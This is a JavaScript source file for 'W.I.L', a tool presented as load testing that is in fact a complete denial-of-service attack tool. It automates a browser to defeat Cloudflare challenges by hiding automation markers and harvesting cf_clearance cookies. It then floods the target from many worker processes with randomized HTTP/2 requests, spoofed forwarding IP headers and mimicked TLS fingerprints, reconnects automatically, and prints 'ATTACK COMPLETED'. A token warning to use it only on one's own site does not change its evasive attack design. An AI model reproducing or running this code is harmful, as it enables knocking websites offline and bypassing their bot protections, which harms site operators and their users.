const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const net = require("net");
const fs = require("fs");
const { EventEmitter } = require("events");

// Increase max listeners to prevent memory leak warnings
EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

// ============================================================================
// ADVANCED TLS CONFIGURATION
// ============================================================================

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const advancedCiphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512",
    "ecdsa_secp521r1_sha512"
];

const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions = 
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

const secureProtocol = "TLS_method";

// ============================================================================
// ADVANCED HEADER POOLS
// ============================================================================

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8"
];

const languageHeaders = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.9',
    'fr-FR,fr;q=0.9,en;q=0.8',
    'de-DE,de;q=0.9,en;q=0.8',
    'es-ES,es;q=0.9,en;q=0.8',
    'it-IT,it;q=0.9,en;q=0.8',
    'pt-BR,pt;q=0.9,en;q=0.8',
    'ja-JP,ja;q=0.9,en;q=0.8',
    'zh-CN,zh;q=0.9,en;q=0.8',
    'ko-KR,ko;q=0.9,en;q=0.8',
    'ru-RU,ru;q=0.9,en;q=0.8',
    'ar-SA,ar;q=0.9,en;q=0.8',
    'hi-IN,hi;q=0.9,en;q=0.8',
    'tr-TR,tr;q=0.9,en;q=0.8',
    'nl-NL,nl;q=0.9,en;q=0.8',
    'sv-SE,sv;q=0.9,en;q=0.8',
    'pl-PL,pl;q=0.9,en;q=0.8'
];

const encodingHeaders = [
    'gzip, deflate, br',
    'gzip, deflate, br, zstd',
    'gzip, deflate',
    'br, gzip, deflate'
];

const cacheHeaders = [
    'no-cache',
    'max-age=0',
    'no-cache, no-store, must-revalidate',
    'no-store',
    'no-cache, no-store, private, max-age=0',
    'public, max-age=0'
];

const fetchModes = [
    'navigate',
    'same-origin',
    'cors',
    'no-cors'
];

const fetchSites = [
    'none',
    'same-origin',
    'same-site',
    'cross-site'
];

const fetchDests = [
    'document',
    'empty',
    'iframe',
    'worker'
];

// ============================================================================
// COMMAND LINE ARGUMENT PARSING
// ============================================================================

if (process.argv.length < 6) {
    console.log("\x1b[31m[ERROR] Invalid arguments\x1b[0m");
    console.log("\x1b[33m[USAGE] node wil.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[36m[EXAMPLE] node wil.js https://example.com 60 10 8 4\x1b[0m");
    console.log("\x1b[35m[INFO] W.I.L - Web Intensive Load with Advanced CF Bypass\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 3
};

const parsedTarget = url.parse(args.target);

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomString(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    return Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
}

function generateQueryString() {
    const params = [];
    const paramCount = randomInt(1, 5);
    for (let i = 0; i < paramCount; i++) {
        const key = randomString(randomInt(3, 10));
        const value = randomString(randomInt(5, 15));
        params.push(`${key}=${value}`);
    }
    return params.join('&');
}

function generatePath(basePath) {
    if (Math.random() < 0.3) {
        const query = generateQueryString();
        return basePath.includes('?') ? `${basePath}&${query}` : `${basePath}?${query}`;
    }
    return basePath;
}

// ============================================================================
// ADVANCED CLOUDFLARE BYPASS SYSTEM
// ============================================================================

class CloudflareBypass {
    constructor(target, attemptNum = 1) {
        this.target = target;
        this.attemptNum = attemptNum;
        this.browser = null;
        this.page = null;
        this.cookies = [];
        this.userAgent = null;
        this.cfClearance = null;
    }

    async initialize() {
        try {
            console.log(`\x1b[33m[CF-BYPASS] Attempt ${this.attemptNum} - Initializing browser...\x1b[0m`);
            
            const response = await connect({
                headless: 'auto',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080',
                    '--disable-blink-features=AutomationControlled',
                    '--disable-web-security',
                    '--disable-features=IsolateOrigins,site-per-process'
                ],
                turnstile: true,
                connectOption: {
                    defaultViewport: null
                }
            });
            
            this.browser = response.browser;
            this.page = response.page;
            
            return true;
        } catch (error) {
            console.log(`\x1b[31m[CF-BYPASS] Initialization failed: ${error.message}\x1b[0m`);
            return false;
        }
    }

    async setupPage() {
        try {
            await this.page.evaluateOnNewDocument(() => {
                Object.defineProperty(navigator, 'webdriver', {
                    get: () => undefined
                });
                
                Object.defineProperty(navigator, 'plugins', {
                    get: () => [1, 2, 3, 4, 5]
                });
                
                Object.defineProperty(navigator, 'languages', {
                    get: () => ['en-US', 'en']
                });
                
                window.chrome = {
                    runtime: {}
                };
                
                Object.defineProperty(navigator, 'permissions', {
                    get: () => ({
                        query: () => Promise.resolve({ state: 'granted' })
                    })
                });
            });
            
            return true;
        } catch (error) {
            console.log(`\x1b[31m[CF-BYPASS] Page setup failed: ${error.message}\x1b[0m`);
            return false;
        }
    }

    async navigateToTarget() {
        try {
            console.log(`\x1b[33m[CF-BYPASS] Navigating to ${this.target}...\x1b[0m`);
            
            await this.page.goto(this.target, { 
                waitUntil: 'domcontentloaded',
                timeout: 60000 
            });
            
            return true;
        } catch (error) {
            console.log(`\x1b[33m[CF-BYPASS] Navigation warning: ${error.message}\x1b[0m`);
            return true; // Continue anyway
        }
    }

    async waitForChallenge() {
        console.log("\x1b[33m[CF-BYPASS] Waiting for Cloudflare challenge...\x1b[0m");
        
        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 120;
        
        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 500));
            
            try {
                const cookies = await this.page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    console.log(`\x1b[32m[CF-BYPASS] Found cf_clearance after ${(checkCount * 0.5).toFixed(1)}s!\x1b[0m`);
                    challengeCompleted = true;
                    break;
                }
                
                challengeCompleted = await this.page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    
                    if (title.includes("just a moment") || 
                        title.includes("checking") ||
                        bodyText.includes("checking your browser") ||
                        bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    
                    return document.body && document.body.children.length > 3;
                });
                
            } catch (evalError) {
                // Continue
            }
            
            checkCount++;
            
            if (checkCount % 20 === 0) {
                console.log(`\x1b[33m[CF-BYPASS] Still waiting... (${(checkCount * 0.5).toFixed(1)}s elapsed)\x1b[0m`);
            }
        }
        
        return challengeCompleted;
    }

    async extractData() {
        try {
            await new Promise(r => setTimeout(r, 1000));
            
            this.cookies = await this.page.cookies();
            this.userAgent = await this.page.evaluate(() => navigator.userAgent);
            
            const cfClearance = this.cookies.find(c => c.name === "cf_clearance");
            if (cfClearance) {
                this.cfClearance = cfClearance.value;
                console.log(`\x1b[32m[CF-BYPASS] cf_clearance: ${cfClearance.value.substring(0, 30)}...\x1b[0m`);
            }
            
            console.log(`\x1b[36m[CF-BYPASS] Extracted ${this.cookies.length} cookies\x1b[0m`);
            
            return true;
        } catch (error) {
            console.log(`\x1b[31m[CF-BYPASS] Data extraction failed: ${error.message}\x1b[0m`);
            return false;
        }
    }

    async cleanup() {
        try {
            if (this.page) await this.page.close();
            if (this.browser) await this.browser.close();
        } catch (error) {
            // Ignore cleanup errors
        }
    }

    async execute() {
        try {
            if (!await this.initialize()) {
                return this.getDefaultResult();
            }
            
            if (!await this.setupPage()) {
                await this.cleanup();
                return this.getDefaultResult();
            }
            
            if (!await this.navigateToTarget()) {
                await this.cleanup();
                return this.getDefaultResult();
            }
            
            const challengeSuccess = await this.waitForChallenge();
            
            if (!challengeSuccess) {
                console.log(`\x1b[33m[CF-BYPASS] Challenge timeout, using partial data\x1b[0m`);
            }
            
            await this.extractData();
            await this.cleanup();
            
            return {
                cookies: this.cookies,
                userAgent: this.userAgent || this.getDefaultUserAgent(),
                cfClearance: this.cfClearance,
                success: this.cookies.length > 0,
                attemptNum: this.attemptNum
            };
            
        } catch (error) {
            console.log(`\x1b[31m[CF-BYPASS] Attempt ${this.attemptNum} failed: ${error.message}\x1b[0m`);
            await this.cleanup();
            return this.getDefaultResult();
        }
    }

    getDefaultUserAgent() {
        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
    }

    getDefaultResult() {
        return {
            cookies: [],
            userAgent: this.getDefaultUserAgent(),
            cfClearance: null,
            success: false,
            attemptNum: this.attemptNum
        };
    }
}

async function bypassCloudflareParallel(target, totalCount) {
    console.log("\x1b[35m[W.I.L] CLOUDFLARE BYPASS - PARALLEL MODE\x1b[0m");
    console.log(`\x1b[36m[W.I.L] Target: ${target}\x1b[0m`);
    console.log(`\x1b[36m[W.I.L] Required sessions: ${totalCount}\x1b[0m`);
    
    const results = [];
    let attemptCount = 0;
    
    const batchSize = 2;
    
    while (results.length < totalCount) {
        const remaining = totalCount - results.length;
        const currentBatchSize = Math.min(batchSize, remaining);
        
        console.log(`\n\x1b[33m[W.I.L] Starting batch (${currentBatchSize} sessions)...\x1b[0m`);
        
        const batchPromises = [];
        for (let i = 0; i < currentBatchSize; i++) {
            attemptCount++;
            const bypass = new CloudflareBypass(target, attemptCount);
            batchPromises.push(bypass.execute());
        }
        
        const batchResults = await Promise.all(batchPromises);
        
        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
                console.log(`\x1b[32m[W.I.L] Session ${result.attemptNum} successful! (${results.length}/${totalCount})\x1b[0m`);
            } else {
                console.log(`\x1b[31m[W.I.L] Session ${result.attemptNum} failed\x1b[0m`);
            }
        }
        
        if (results.length < totalCount) {
            console.log(`\x1b[33m[W.I.L] Waiting 3s before next batch...\x1b[0m`);
            await new Promise(r => setTimeout(r, 3000));
        }
    }
    
    if (results.length === 0) {
        console.log("\x1b[33m[W.I.L] No CF cookies obtained, using default headers\x1b[0m");
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true
        });
    }
    
    console.log(`\n\x1b[32m[W.I.L] Total sessions obtained: ${results.length}\x1b[0m`);
    return results;
}

// ============================================================================
// ADVANCED HTTP/2 FLOODING ENGINE
// ============================================================================

class HTTP2Flooder {
    constructor(userAgent, cookieString, bypassInfo) {
        this.userAgent = userAgent;
        this.cookieString = cookieString;
        this.bypassInfo = bypassInfo;
        this.client = null;
        this.tlsSocket = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
    }

    generateDynamicHeaders() {
        const parsed = parsedTarget;
        const path = generatePath(parsed.path);
        
        const chromeVersion = this.extractChromeVersion(this.userAgent) || "120";
        
        let baseHeaders = {
            ":method": "GET",
            ":authority": parsed.host,
            ":scheme": "https",
            ":path": path,
        };

        let dynamicHeaders = {
            "user-agent": this.userAgent,
            "accept": randomElement(acceptHeaders),
            "accept-language": randomElement(languageHeaders),
            "accept-encoding": randomElement(encodingHeaders),
            "cache-control": randomElement(cacheHeaders),
            "upgrade-insecure-requests": "1",
            "sec-fetch-dest": randomElement(fetchDests),
            "sec-fetch-mode": randomElement(fetchModes),
            "sec-fetch-site": randomElement(fetchSites),
            "sec-fetch-user": Math.random() < 0.7 ? "?1" : "?0",
            "sec-ch-ua": `"Chromium";v="${chromeVersion}", "Not(A:Brand";v="24", "Google Chrome";v="${chromeVersion}"`,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": this.getRandomPlatform(),
            "priority": this.getRandomPriority(),
            "te": "trailers"
        };

        if (this.cookieString) {
            dynamicHeaders["cookie"] = this.cookieString;
        }

        // Add custom spoofing headers
        if (Math.random() < 0.4) {
            dynamicHeaders["x-forwarded-for"] = this.generateRandomIP();
        }
        
        if (Math.random() < 0.3) {
            dynamicHeaders["x-real-ip"] = this.generateRandomIP();
        }

        if (Math.random() < 0.5) {
            dynamicHeaders["x-requested-with"] = "XMLHttpRequest";
        }

        // Advanced fingerprint randomization
        const customHeaders = this.generateCustomHeaders();
        
        return { ...baseHeaders, ...dynamicHeaders, ...customHeaders };
    }

    generateCustomHeaders() {
        const headers = {};
        
        if (Math.random() < 0.3) {
            headers["x-wil-signature"] = randomString(32);
        }
        
        if (Math.random() < 0.4) {
            headers["x-session-token"] = randomString(40);
        }
        
        if (Math.random() < 0.5) {
            headers["x-request-id"] = crypto.randomUUID();
        }
        
        if (Math.random() < 0.3) {
            headers["x-trace-id"] = randomString(24);
        }
        
        if (Math.random() < 0.4) {
            headers["x-client-data"] = Buffer.from(randomString(16)).toString('base64');
        }

        return headers;
    }

    extractChromeVersion(userAgent) {
        const match = userAgent.match(/Chrome\/([\d.]+)/);
        return match ? match[1].split('.')[0] : null;
    }

    getRandomPlatform() {
        const platforms = ["Windows", "macOS", "Linux", "Chrome OS"];
        return `"${randomElement(platforms)}"`;
    }

    getRandomPriority() {
        const priorities = ["u=0, i", "u=1, i", "u=2, i", "u=3, i"];
        return randomElement(priorities);
    }

    generateRandomIP() {
        return `${randomInt(1, 255)}.${randomInt(0, 255)}.${randomInt(0, 255)}.${randomInt(1, 255)}`;
    }

    createAdvancedTLSSocket() {
        const secureOptionsList = [
            crypto.constants.SSL_OP_NO_RENEGOTIATION,
            crypto.constants.SSL_OP_NO_TICKET,
            crypto.constants.SSL_OP_NO_SSLv2,
            crypto.constants.SSL_OP_NO_SSLv3,
            crypto.constants.SSL_OP_NO_COMPRESSION,
            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION,
            crypto.constants.SSL_OP_TLSEXT_PADDING,
            crypto.constants.SSL_OP_ALL
        ];

        const tlsSocket = tls.connect({
            host: parsedTarget.host,
            port: 443,
            servername: parsedTarget.host,
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3",
            ciphers: advancedCiphers,
            sigalgs: sigalgs.join(':'),
            ecdhCurve: ecdhCurve,
            honorCipherOrder: true,
            ALPNProtocols: ["h2", "http/1.1"],
            rejectUnauthorized: false,
            secureOptions: Math.random() < 0.5 
                ? secureOptionsList[Math.floor(Math.random() * secureOptionsList.length)]
                : secureOptions,
            secureProtocol: secureProtocol
        });

        tlsSocket.setKeepAlive(true, 60000);
        tlsSocket.setNoDelay(true);
        
        return tlsSocket;
    }

    async startFlooding() {
        try {
            this.tlsSocket = this.createAdvancedTLSSocket();
            
            this.client = http2.connect(parsedTarget.href, {
                createConnection: () => this.tlsSocket,
                settings: {
                    headerTableSize: 65536,
                    enablePush: false,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    maxConcurrentStreams: 1000,
                    maxHeaderListSize: 262144,
                    enableConnectProtocol: false
                }
            });

            this.client.on("connect", (session) => {
                try {
                    session.setLocalWindowSize(15663105);
                } catch (err) {
                    // Ignore
                }
                
                this.floodLoop();
            });

            this.client.on("error", (error) => {
                this.handleError(error);
            });

            this.client.on("close", () => {
                this.handleClose();
            });

            this.client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                this.handleGoaway(errorCode);
            });

        } catch (error) {
            this.handleError(error);
        }
    }

    floodLoop() {
        const interval = randomInt(50, 200);
        
        const floodInterval = setInterval(() => {
            if (!this.client || this.client.destroyed) {
                clearInterval(floodInterval);
                return;
            }

            for (let i = 0; i < args.rate; i++) {
                this.sendRequest();
            }
        }, interval);

        // Store interval for cleanup
        this.floodInterval = floodInterval;
    }

    sendRequest() {
        try {
            if (!this.client || this.client.destroyed) {
                return;
            }

            const headers = this.generateDynamicHeaders();
            
            const request = this.client.request(headers, {
                weight: Math.random() < 0.5 ? randomInt(1, 256) : 256,
                depends_on: 0,
                exclusive: Math.random() < 0.3
            });

            request.setEncoding('utf8');

            request.on("response", (responseHeaders) => {
                global.successRequests = (global.successRequests || 0) + 1;
                global.totalRequests = (global.totalRequests || 0) + 1;

                const status = responseHeaders[":status"];
                
                if (status === 429 || status === 503) {
                    // Rate limited, slow down
                    setTimeout(() => {}, 2000);
                }
            });

            request.on("error", (error) => {
                global.failedRequests = (global.failedRequests || 0) + 1;
                global.totalRequests = (global.totalRequests || 0) + 1;
            });

            request.end();

        } catch (error) {
            global.failedRequests = (global.failedRequests || 0) + 1;
            global.totalRequests = (global.totalRequests || 0) + 1;
        }
    }

    handleError(error) {
        this.cleanup();
        
        if (this.reconnectAttempts < this.maxReconnectAttempts) {
            this.reconnectAttempts++;
            const delay = Math.min(1000 * Math.pow(2, this.reconnectAttempts), 10000);
            setTimeout(() => {
                this.startFlooding();
            }, delay);
        }
    }

    handleClose() {
        this.cleanup();
        this.startFlooding();
    }

    handleGoaway(errorCode) {
        this.cleanup();
        
        const backoff = Math.min(2000 * Math.pow(2, this.reconnectAttempts), 15000);
        setTimeout(() => {
            this.reconnectAttempts++;
            this.startFlooding();
        }, backoff);
    }

    cleanup() {
        try {
            if (this.floodInterval) {
                clearInterval(this.floodInterval);
            }
            
            if (this.client) {
                this.client.destroy();
                this.client = null;
            }
            
            if (this.tlsSocket) {
                this.tlsSocket.destroy();
                this.tlsSocket = null;
            }
        } catch (error) {
            // Ignore cleanup errors
        }
    }
}

// ============================================================================
// WORKER FLOODING FUNCTION
// ============================================================================

function runFlooder() {
    const bypassInfo = randomElement(global.bypassData || []);
    if (!bypassInfo) {
        console.log("\x1b[31m[ERROR] No bypass data available\x1b[0m");
        return;
    }

    const cookieString = bypassInfo.cookies 
        ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") 
        : "";
    
    const userAgent = bypassInfo.userAgent || randomElement(userAgents);
    
    const flooder = new HTTP2Flooder(userAgent, cookieString, bypassInfo);
    flooder.startFlooding();
}

// ============================================================================
// STATISTICS DISPLAY
// ============================================================================

function displayStats() {
    const elapsed = Math.floor((Date.now() - global.startTime) / 1000);
    const remaining = Math.max(0, args.time - elapsed);
    
    console.clear();
    console.log("\x1b[35m╔═══════════════════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║         W.I.L - WEB INTENSIVE LOAD TESTING               ║\x1b[0m");
    console.log("\x1b[35m╚═══════════════════════════════════════════════════════════╝\x1b[0m");
    console.log(`\x1b[36m[TARGET]\x1b[0m ${args.target}`);
    console.log(`\x1b[36m[TIME]\x1b[0m ${elapsed}s / ${args.time}s (${remaining}s remaining)`);
    console.log(`\x1b[36m[CONFIG]\x1b[0m Rate: ${args.rate}/s | Threads: ${args.threads} | Sessions: ${global.bypassData ? global.bypassData.length : 0}`);
    console.log("");
    console.log("\x1b[33m[STATISTICS]\x1b[0m");
    console.log(`   \x1b[32mSuccess:\x1b[0m ${(global.successRequests || 0).toLocaleString()}`);
    console.log(`   \x1b[31mFailed:\x1b[0m ${(global.failedRequests || 0).toLocaleString()}`);
    console.log(`   \x1b[36mTotal:\x1b[0m ${(global.totalRequests || 0).toLocaleString()}`);
    
    const reqPerSec = elapsed > 0 ? ((global.totalRequests || 0) / elapsed).toFixed(2) : 0;
    console.log(`   \x1b[33mSpeed:\x1b[0m ${reqPerSec} req/s`);
    
    const total = global.totalRequests || 0;
    const success = global.successRequests || 0;
    const successRate = total > 0 ? ((success / total) * 100).toFixed(2) : 0;
    console.log(`   \x1b[32mSuccess Rate:\x1b[0m ${successRate}%`);
    
    if (remaining > 0) {
        const progress = Math.floor((elapsed / args.time) * 40);
        const progressBar = "█".repeat(progress) + "░".repeat(40 - progress);
        const percentage = ((elapsed / args.time) * 100).toFixed(1);
        console.log(`\n\x1b[36m[PROGRESS] [${progressBar}] ${percentage}%\x1b[0m`);
    }
    
    console.log("\x1b[35m═══════════════════════════════════════════════════════════\x1b[0m");
}

// ============================================================================
// MAIN EXECUTION
// ============================================================================

// Initialize global stats
global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.clear();
    console.log("\x1b[35m╔═══════════════════════════════════════════════════════════╗\x1b[0m");
    console.log("\x1b[35m║         W.I.L - WEB INTENSIVE LOAD TESTING               ║\x1b[0m");
    console.log("\x1b[35m║         Advanced CF Bypass & HTTP/2 Flooding             ║\x1b[0m");
    console.log("\x1b[35m╚═══════════════════════════════════════════════════════════╝\x1b[0m");
    console.log("\x1b[33m[WARNING] ONLY USE FOR YOUR OWN WEBSITE!\x1b[0m\n");
    
    (async () => {
        // Phase 1: Cloudflare Bypass
        console.log("\x1b[36m[PHASE 1] Starting Cloudflare bypass...\x1b[0m\n");
        const bypassResults = await bypassCloudflareParallel(args.target, args.cookieCount);
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m[SUCCESS] Obtained ${bypassResults.length} sessions!\x1b[0m`);
        console.log("\x1b[36m[PHASE 2] Starting attack threads...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        // Phase 2: Start attack threads
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults 
            });
        }
        
        // Phase 3: Statistics monitoring
        const statsInterval = setInterval(displayStats, 1000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests += message.total || 0;
                global.successRequests += message.success || 0;
                global.failedRequests += message.failed || 0;
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: bypassResults 
                });
            }
        });
        
        // Phase 4: Cleanup
        setTimeout(() => {
            clearInterval(statsInterval);
            displayStats();
            
            console.log("\n\x1b[35m╔═══════════════════════════════════════════════════════════╗\x1b[0m");
            console.log("\x1b[35m║                   ATTACK COMPLETED                        ║\x1b[0m");
            console.log("\x1b[35m╚═══════════════════════════════════════════════════════════╝\x1b[0m");
            console.log(`\x1b[36m[FINAL STATS]\x1b[0m`);
            console.log(`   Total Requests: ${(global.totalRequests || 0).toLocaleString()}`);
            console.log(`   Successful: ${(global.successRequests || 0).toLocaleString()}`);
            console.log(`   Failed: ${(global.failedRequests || 0).toLocaleString()}`);
            console.log(`   Sessions Used: ${bypassResults.length}`);
            console.log(`   Duration: ${args.time}s`);
            console.log(`   Average Speed: ${((global.totalRequests || 0) / args.time).toFixed(2)} req/s`);
            
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    // Worker process
    let workerBypassData = [];
    
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            // Start multiple flood instances per worker
            const instancesPerWorker = 5;
            for (let i = 0; i < instancesPerWorker; i++) {
                setTimeout(() => {
                    runFlooder();
                }, i * 100);
            }
            
            // Stats reporting
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests || 0,
                    success: global.successRequests || 0,
                    failed: global.failedRequests || 0
                });
                
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
            }, 1000);
        }
    });
    
    // Worker cleanup
    setTimeout(() => {
        process.exit(0);
    }, args.time * 1000);
}

// Error handling
process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
process.on('SIGTERM', () => process.exit(0));
process.on('SIGINT', () => process.exit(0));
